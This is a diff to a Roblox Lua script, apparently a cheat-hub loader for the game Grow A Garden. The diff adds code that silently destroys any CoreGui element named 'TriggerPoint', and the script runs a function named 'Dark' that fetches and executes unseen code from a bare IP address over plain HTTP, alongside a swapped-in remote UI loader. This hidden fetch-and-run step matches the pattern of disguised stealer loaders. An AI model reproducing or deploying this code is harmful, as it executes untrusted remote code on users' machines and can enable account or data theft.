@@ -1,9 +1,21 @@
+local CoreGui = game:GetService("CoreGui")
+local trigger = CoreGui:FindFirstChild("TriggerPoint", true)
+if trigger then
+    trigger:Destroy()
+end
+
+CoreGui.DescendantAdded:Connect(function(obj)
+    if obj.Name == "TriggerPoint" then
+        obj:Destroy()
+    end
+end)
+
 local function Dark()   
 ID="7ada2f70-07ff-4d15-8206-e39f7501ce5f";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 end
 local function loadui()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Ankazxc/Loader/refs/heads/main/SpawnerHubGag'))()
+    loadstring(game:HttpGet("https://codeberg.org/Redz/Red/raw/branch/main/GrowAGardenHub"))()                          
 end
 
 task.spawn(Dark)
